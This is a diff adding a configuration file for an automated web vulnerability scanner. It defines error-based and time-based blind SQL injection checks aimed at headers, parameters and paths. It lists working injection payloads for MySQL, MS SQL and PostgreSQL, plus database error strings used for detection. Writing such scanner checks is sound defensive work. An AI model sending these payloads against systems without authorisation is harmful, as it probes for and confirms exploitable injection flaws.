@@ -1,0 +1,177 @@
+# This configuration holds security checks for SQL injection vulnerabilities.
+#
+security_test <
+  name: "reflected SQL injection"
+  issue_type: SQL_INJECTION
+
+  generator_rule <
+    method: APPEND_TO_VALUE
+    method: PREFIX_VALUE
+    encoding: NONE
+    encoding: URL
+
+    target <
+      type: HEADERS
+      target_name: "User-Agent"
+    >
+    target <
+      type: URL_PARAMS
+    >
+    target <
+      type: BODY_PARAMS
+    >
+    target <
+      type: PATH_ELEMENTS
+      last_field_only: true
+    >
+
+    payload <
+      type: STRING
+      # Payload that should trigger an error in poorly constructed or
+      # poorly escaped queries.
+      arg: "\\\"\"\\''"
+    >
+  >
+
+  # Just like with all response matching: this rule is first applied to the
+  # original server response to make sure it does not already match.
+  # E.g. we wouldn't want this to generate false positives on a database
+  # forum post in which an error is discussed.
+  matching_rule <
+    condition <
+      target: RESPONSE_BODY
+      match <
+        method: CONTAINS
+        # MySQL
+        value: "You have an error in your SQL syntax"
+        # SQL Server
+        value: "Incorrect syntax near the keyword"
+        value: "Unclosed quotation mark after the character string"
+        # Postgresql
+        value: "syntax error at or near"
+        value: "unterminated quoted std::string at or near"
+        value: "parser: parse error at or near"
+        value: "Query failed: ERROR:"
+        # Access
+        value: "Syntax error in std::string in query expression"
+        # Generic ODBC error
+        value: "Microsoft OLE DB Provider for ODBC Drivers error"
+        # Oracle
+        value: "SQL command not properly ended"
+        # springframework
+        value: "org.springframework.jdbc.BadSqlGrammarException: StatementCallback; bad SQL grammar"
+        value: "java.sql.SQLSyntaxErrorException: malformed string:"
+      >
+    >
+  >
+
+  allow_serial_evaluation: true
+  advisory <
+    severity: HIGH
+    title: "A SQL injection vulnerability was detected (error message based)."
+    description: ""
+    recommendation: ""
+  >
+>
+
+security_test <
+  name: "blind SQL injection"
+  issue_type: BLIND_SQL_INJECTION
+
+  generator_rule <
+    method: APPEND_TO_VALUE
+    method: PREFIX_VALUE
+    encoding: NONE
+    encoding: URL
+
+    target <
+      type: HEADERS
+      target_name: "User-Agent"
+    >
+    target <
+      type: URL_PARAMS
+    >
+    target <
+      type: BODY_PARAMS
+    >
+    target <
+      type: PATH_ELEMENTS
+      last_field_only: true
+    >
+
+    payload <
+      type: STRING
+      # MySQL
+      arg: "1'+sleep(8)+'1"
+      arg: "1'+sleep(8)+'1"
+      arg: "a'.sleep(8).'a"
+      arg: "a\".sleep(8).\"a"
+      arg: " or sleep(8)=0 limit 1#"
+      arg: "' or sleep(8)=0 limit 1#"
+      arg: "\" or sleep(8)=0 limit 1#"
+      arg: "') or sleep(8)=0 limit 1#"
+      arg: "\") or sleep(8)=0 limit 1#"
+      arg: "' AND (SELECT 42 FROM (SELECT(SLEEP(8)))foo) AND 'x'='x"
+      arg: "(SELECT * FROM (SELECT(SLEEP(8)))foo)"
+      arg: "+(SELECT * FROM (SELECT(SLEEP(8)))foo)+"
+      arg: "(SELECT * FROM (SELECT(SLEEP(8)))foo)#"
+      arg: "(SELECT * FROM (SELECT(SLEEP(8)))foo)--"
+      # Insert into keys payloads
+      arg: "a) values (sleep(8),0)#"
+      arg: ") values (sleep(8),0,0)#"
+      arg: ") values (sleep(8),0,0,0)#"
+      arg: ") values (sleep(8),0,0,0,0)#"
+      arg: ") values (sleep(8),0,0,0,0,0)#"
+      arg: ") values (sleep(8),0,0,0,0,0,0)#"
+      arg: ") values (sleep(8),0,0,0,0,0,0,0)#"
+      arg: ") values (sleep(8),0,0,0,0,0,0,0,0)#"
+
+      # MS SQL
+      arg: " waitfor delay '00:00:08'-- "
+      arg: "' waitfor delay '00:00:08'-- "
+      arg: "\" waitfor delay \"00:00:08\"-- "
+      arg: "') waitfor delay '00:00:08'-- "
+      arg: "\") waitfor delay \"00:00:08\"-- "
+      arg: "')) waitfor delay '00:00:08'-- "
+      arg: "\")) waitfor delay \"00:00:08\"-- "
+      arg: "'0,0,0) waitfor delay '00:00:08'-- "
+      arg: "',0,0) waitfor delay '00:00:08'-- "
+      arg: "',0) waitfor delay '00:00:08'-- "
+      # PostgreSQL
+      arg: ") values (pg_sleep(8),0);--"
+      arg: ") values (pg_sleep(8),0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0,0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0,0,0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0,0,0,0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0,0,0,0,0,0);--"
+      arg: ") values (pg_sleep(8),0,0,0,0,0,0,0,0,0);--"
+      arg: "(select 42 from pg_sleep(8))"
+      arg: "(select 42 from pg_sleep(8)) as test"
+      arg: "plus\"||(select 42 from pg_sleep(8))||\"fish"
+      arg: "plus'||(select 42 from pg_sleep(8))||'fish"
+    >
+  >
+
+  matching_rule <
+    condition <
+      target: RESPONSE_BODY
+      match <
+        method: TIMING
+        timing <
+          min_duration_ms: 8000
+          max_duration_ms: 8500
+        >
+      >
+    >
+  >
+
+  allow_serial_evaluation: true
+  advisory <
+    severity: HIGH
+    title: "A blind SQL injection vulnerability was detected ."
+    description: ""
+    recommendation: ""
+  >
+>
